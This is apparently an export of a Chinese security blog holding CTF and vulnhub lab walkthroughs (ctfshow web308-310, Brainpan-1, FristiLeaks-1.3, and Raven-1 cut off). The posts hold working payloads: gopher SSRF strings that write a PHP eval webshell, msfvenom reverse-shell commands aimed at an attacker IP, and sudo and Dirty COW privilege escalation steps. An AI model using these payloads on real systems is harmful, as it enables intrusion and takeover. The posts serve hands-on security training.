class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%42%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%3d%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NTE6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDIlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjclM2MlM2YlM2QlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2YlM2UlMjclMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjclMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjclM2IlMDElMDAlMDAlMDAlMDEiO319</span></span><br></pre></td></tr></table></figure><p>最后payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">1=system(&#x27;tac flaaaaaag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web309"><a class="header-anchor" href="#web309">¶</a>web309</h2><ul><li>描述: 需要拿shell，308的方法不行了,mysql 有密码了</li></ul><p>上一题利用链都没变, 只改了密码, 这里是利用SSRF漏洞攻击FastCGI</p><blockquote><p>前置条件:</p><ul><li>PHP版本大于5.3.3, 此时才能修改PHP.INI</li><li>知道一个PHP文件的绝对路径</li><li>PHP_FRM监听本机9000</li></ul></blockquote><p>没学明白, 后面再写一个复现, 就先当脚本小子: 一样用上面那个工具</p><blockquote><p>这里可以替换<code>tac f*</code>为<code>echo &quot;&lt;?=eval(\$_POST[1])?&gt;&quot; &gt;1.php</code></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit fastcgi</span><br><span class="line">index.php</span><br><span class="line"><span class="built_in">tac</span> f*</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008222458775.png" alt="image-20241008222458775"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo1NzU6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlRjYlMDYlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RINTglMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTA5U0NSSVBUX0ZJTEVOQU1FaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDAlM0ElMDQlMDAlM0MlM0ZwaHAlMjBzeXN0ZW0lMjglMjd0YWMlMjBmJTJBJTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAwIjt9fQ==</span></span><br></pre></td></tr></table></figure><p>抓包, 发包即可</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008223338228.png" alt="image-20241008223338228"></p><h2 id="web310"><a class="header-anchor" href="#web310">¶</a>web310</h2><ul><li>描述: 代码审计告一段落</li></ul><p>利用web309的方法依然可以获得shell, 但是拿不到真的flag</p><p>利用链没变, 但是端口关了, 那就利用<code>file:///</code>协议读取一下配置文件</p><blockquote><p>你说是不是可以在shell里面直接读配置文件<code>nginx.conf</code>, 懒得出去截图了</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008225357967.png" alt="image-20241008225357967"></p><p>发现监听了4476端口, 初始目录是<code>/var/flag</code>, flag就在这个路径下面的<code>index.php</code></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> MySQL </tag>
            
            <tag> 绕过 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> PHP </tag>
            
            <tag> SSRF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> FastCGI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brainpan-1</title>
      <link href="/article/Brainpan-1/"/>
      <url>/article/Brainpan-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Brainpan</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/brainpan-1,51/">vulnhub靶场-brainpan: 1</a></p><p>目标: 没说</p><p>提示: 这个靶机和web关系不大, 主要是缓冲区溢出</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.5</p><p>target: 192.168.56.15</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><ul><li>端口: 9999, 10000</li><li>中间件: python 2.7.3(10000)</li><li>目录: /bin(10000)</li><li>系统: linux 2.6.32-3.10</li></ul><p>基本上都是空的或者静态的, 没什么好搜索的</p><p><code>/bin</code>目录下是一个exe文件, 但是系统是Linux?可能是开了windows服务</p><p>将这个文件下载下来, 找个地儿运行, 发现创建了9999端口的服务, 那看来靶机的9999端口就是这个了</p><p>既然只有这个能利用, 那尝试是否有缓冲区溢出</p><p>脚本小子必备: <a href="https://github.com/jessekurrus/brainpan">https://github.com/jessekurrus/brainpan</a></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>用什么调试软件都行, 我这里用的ollydbg</p><ol><li>利用脚本批量产生无意义字符测试文件, 看看是否存在溢出</li></ol><p>当脚本出现以下情况, 则说明有缓冲区溢出, 此时运行的程序会报错或闪退</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 .\brainfuzzer.py 127.0.0.1 9999</span><br><span class="line"><span class="comment"># 我这里是运行到大概600就停止了</span></span><br><span class="line"><span class="comment"># [+] Connection failed. Make sure IP/port are correct, or check debugger for brainpan.exe crash.</span></span><br></pre></td></tr></table></figure><ol start="2"><li>判断溢出点</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate pattern_create.rb</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span><br><span class="line"><span class="comment"># 生成1000位的可以反查的字符(一定要大于溢出的极限), 复制下来然后放法到brainpan1.py运行</span></span><br><span class="line">python2 brainpan1.py 127.0.0.1 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002124224436.png" alt="image-20241002124224436"></p><p>我用的ollydbg, 运行脚本会直接报错: “不知如何继续, 因为内存地址35724134不可读. 请尝试更改EIP或忽路程序异常”</p><blockquote><p>EIP(instrutor pointer指令指针), 这个寄存器标记了下一条指令的内存地址, 是进行缓冲区溢出的关键所在</p></blockquote><p>用这个去反差溢出点:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate pattern_off</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134    <span class="comment"># 反查溢出点</span></span><br><span class="line"><span class="comment"># [*] Exact match at offset 524</span></span><br></pre></td></tr></table></figure><blockquote><p>EIP内的值是35724134，这是ASCII码的值，由于小端显示的原因(逆序)，相当于4Ar5, 可以将上面的指令改为查询4Ar5</p></blockquote><p>可以看到偏移量是524, 也就是发送524+4个字符, 即可覆盖EIP寄存器, EIP寄存器存储的内容就是发送的528个字符中的最后4个字符(EIP寄存器从525开始)</p><p>接下来就是要让EIP指向我们的shellcode; 当发生溢出的情况时, 系统就会自动调用ESP, 这一段内存里面存放的是下一跳的信息, 本意是避免溢出导致计算机崩溃, 而让程序继续进行, 所以我们只需要知道他下一跳的地址以及大小, 然后我们构造相对应的shellcode即可</p><ol start="3"><li>获取shellcode空间大小</li></ol><p>shellcode大小通常在300-400字节, 1000肯定是游刃有余; 这个程序用524个A填充EBP, 用B填充EIP, 用C填充ESP</p><p>记得重置程序</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002133149882.png" alt="image-20241002133149882"></p><p>右键ESP, 选择&quot;数据中窗口跟随&quot;, 可以轻易找到从005FF910-005FFAE7都是C, 找个计算器算一算, 得到容量为471</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002134742643.png" alt="image-20241002134742643"></p><ol start="4"><li>查找坏字符</li></ol><p>避免因为使用不支持的字符或使程序中断的字符导致利用失败, 运行brainpan3.py即可, 这里就不演示了</p><ol start="5"><li>JMP ESP定位</li></ol><p>想要将程序的执行流程跳转到ESP, 需要找到汇编指令JMP ESP的内存地址, 将这个地址塞进EIP中</p><p>这样运行程序就变成了: EIP-&gt;JMP ESP-&gt;ESP</p><p>用的是ollydbg, 可以直接省去一大堆操作, 直接<code>ctrl+f</code>搜索&quot;jmp esp&quot;</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002142122430.png" alt="image-20241002142122430"></p><p>我们要将这个内存地址写到EIP中, 由于小端显示的问题, 需要按照字节倒序的方式填入EIP中即&quot;\xf3\x12\x17\x31&quot;</p><ol start="6"><li>在ESP中填入shellcode</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=6666 -b <span class="string">&quot;\x00&quot;</span> -f c</span><br></pre></td></tr></table></figure><p>自动使用了x86/shikata_ga_nai编码模块</p><p>我的推荐是将<code>-f c</code>改为<code>-f py</code>, 可以直接复制进py</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002144030801.png" alt="image-20241002144030801"></p><p>利用msf监听, 运行脚本即可, 回到根目录发现是linux的文件结构, 这个windows还真是linux下的服务之一</p><p>现在重新生成linux的木马:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.56.5 -b <span class="string">&quot;\x00&quot;</span> -f py</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002145412671.png" alt="image-20241002145412671"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><p>10000端口服务由<code>/home/puck/checksrv.sh</code>启动, 9999也是这个文件调用brainpan.exe开启的</p><blockquote><p><code>lsb_release -a</code> 查看发行版本, 不是那么泛用</p></blockquote><ul><li>权限: puck</li><li>发行版本: Ubuntu 12.1.</li><li>内核: Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux</li><li>环境: python</li><li>用户: anasi, puck, reynard</li><li>服务: 无</li></ul><p><code>sudo -l</code>发现在<code>/home/anansi/bin/anansi_util</code>有免密运行的root权限</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>因为不给访问, 就直接用路径了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line"><span class="comment"># 只有三条命令, 只有manual [command]可以交互</span></span><br></pre></td></tr></table></figure><p>查了一下, 发现可以在manual查看手册的时候执行其他命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util manual <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 不要直接回车</span></span><br><span class="line">!<span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002153326787.png" alt="image-20241002153326787"></p><p>如果从此处创建一个bash, 那就是root权限, 直接抓到flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002153513690.png" alt="image-20241002153513690"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> sudo提权 </tag>
            
            <tag> 工具利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FristiLeaks-1.3</title>
      <link href="/article/FristiLeaks-1.3/"/>
      <url>/article/FristiLeaks-1.3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>FristiLeaks-1.3</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">vulnhub靶场-FristiLeaks:1.3</a></p><p>目标:  get UID 0 (root) and read the special flag file. Timeframe: should be doable in 4 hours. (该描述在首页源码中)</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.5</p><p>target: 192.168.56.14</p><p>注意需要配置MAC地址, 否则会出现靶机启动后不会显示ip地址, 应该会显现&quot;你的网络配置有点问题&quot;之类的; 下图是正确配置之后的截图:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001145155923.png" alt="image-20241001145155923"></p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><ul><li>端口: 80</li><li>中间件: Apache httpd 2.2.15</li><li>目录: /robots.txt-&gt;/cola /sisi /beer, /cgi-bin, /images</li><li>系统: CentOS</li></ul><p>什么也没有, 要么forbidden要么被告知错误</p><p>扒拉网站的字符串试试, 也没有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://192.168.56.14 -w pc.txt</span><br></pre></td></tr></table></figure><p>那就扒拉图片的字符, 试出来有一个<code>/fristi/</code>, 是登录界面</p><p>源码中有一大串base64, 甚至还有注释:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001151845989.png" alt="image-20241001151845989"></p><p>这个base64解码后有png头, 试试base64在线转图片, 可以得到一大串字符: <code>keKkeKKeKKeKkEkkEk</code></p><p>结合这是eezeepz留下来的, 账密即为<code>eezeepz : keKkeKKeKKeKkEkkEk</code></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>登录看到一个文件上传, 上传目录为<code>/uploads</code>, 而且是白名单, 仅能通过png, jpg, gif</p><p>但是Apache HTTPD有一个多后缀解析漏洞: 只要一个文件含有.php后缀的文件即将被识别成PHP文件, 没必要是最后一个后缀, 我们就赌管理员设置出现问题有这个漏洞</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001153759922.png" alt="image-20241001153759922"></p><p>好, 连上了就继续吧</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><ul><li>权限: apache</li><li>内核: Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</li><li>环境: gcc, cc, python</li><li>用户: admin, eezeepz, fristigod, 没有打开22端口</li><li>服务: MySQL, 没找到密码</li></ul><p>在<code>/var/www</code>下有一个notes.txt, 提示我们eezeepz的<code>/home</code>可能有东西, 来自jerry</p><p>然后<code>/home/eezeepz</code>下找到另一个notes.txt, 翻译一下:</p><ol><li>我们只能访问<code>/usr/bin/*</code></li><li>在<code>/tmp/runthis</code>中, 该脚本以admin身份定时执行任何命令</li></ol><p>但是可以利用目录穿越, 将这个文件将admin不可访问的变为可以任意访问的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/usr/bin/../../bin/chmod -R 777 /home/admin&#x27;</span> &gt; /tmp/runthis</span><br></pre></td></tr></table></figure><p>稍等便可以进入<code>/home/admin</code>, 该目录下<code>whoisyourgodnow.txt</code>和<code>cryptedpass.txt</code>各有一段加密的字符串:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=RFn0AKnlMHMPIzpyuTI0ITG</span><br><span class="line">mVGZ3O3omkJLmy2pcuTq</span><br></pre></td></tr></table></figure><p>还找到一个加密脚本<code>cryptpass.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span></span><br><span class="line"><span class="keyword">import</span> base64,codecs,sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encodeString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    base64string= base64.b64encode(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> codecs.encode(base64string[::-<span class="number">1</span>], <span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cryptoResult=encodeString(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span> cryptoResult</span><br></pre></td></tr></table></figure><p>编写解密脚本即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,codecs,sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryptString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    rot13str = codecs.decode(<span class="built_in">str</span>[::-<span class="number">1</span>], <span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(rot13str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> decryptString(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>解密如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python decrypt.py =RFn0AKnlMHMPIzpyuTI0ITG</span><br><span class="line"><span class="comment"># LetThereBeFristi!</span></span><br><span class="line">python decrypt.py mVGZ3O3omkJLmy2pcuTq</span><br><span class="line"><span class="comment"># thisisalsopw123</span></span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>尝试su切换用户, 得到<code>fristigod : LetThereBeFristi!</code></p><p>利用<code>sudo -l</code>, 发现该用户可以通过sudo控制<code>/var/fristigod/.secret_admin_stuff/doCom</code>, 在历史命令(<code>history</code>)中也是多次利用这个文件查看根目录下文件XC899`459尘白89 , 可以利用该文件提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001164141279.png" alt="image-20241001164141279"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>低版本linux内核可以直接用脏牛漏洞:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 40839</span><br><span class="line">gcc -pthread 40839.c -o dcow -lcrypt</span><br><span class="line">./dcow admin</span><br><span class="line"><span class="comment"># 提示将firefart密码修改为rong为root权限</span></span><br><span class="line">su firefart</span><br><span class="line"><span class="comment"># 输入admin即可</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Raven-1</title>
      <link href="/article/Raven-1/"/>
      <url>/article/Raven-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Raven-1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/raven-1,256/">vulnhub靶场-Raven:2</a></p><p>目标: There are four flags to find and two intended ways of getting root.</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>target: 192.168.56.13</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><ul><li>端口: 22, 80, 111</li><li>服务: Apache httpd 2.4.10, ssh, rpcbind 2-4, wordpress 4.8.7</li><li>系统: Debian, Linux 3.2 - 4.9</li><li>目录: /wordpress, /vendor, /manual</li></ul><h3 id="flag1"><a class="header-anchor" href="#flag1">¶</a>flag1</h3><p>翻翻源码, <code>/service.html</code>源码中有flag1</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930172047275.png" alt="image-20240930172047275"></p><p>从<code>/vendor</code>中可以通过README.md和VERSION知道还开了个 PHPMailer 5.2.16 服务, 以及网站目录为<code>/var/www/html</code></p><p>尝试访问wordpress后台, 发现需要修改hosts文件才能正常访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"># 添加如下</span><br><span class="line">192.168.56.13   raven.local</span><br></pre></td></tr></table></figure><p>暂时没有找到wordpress能利用的漏洞, 但是wpscan扫描器可以用于扒拉用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.13/wordpress -ep -eu</span><br><span class="line"><span class="comment"># 这个没有wpscan密钥API也行, 是检查安装的插件和用户</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930193256835.png" alt="image-20240930193256835"></p><p>先留着, 可能哪里有用呢</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>先打了Raven-2, 可以得知这个PHPMailer肯定会出问题的, 还是通过searchsploit搜索可利用脚本</p><figure class="highlight 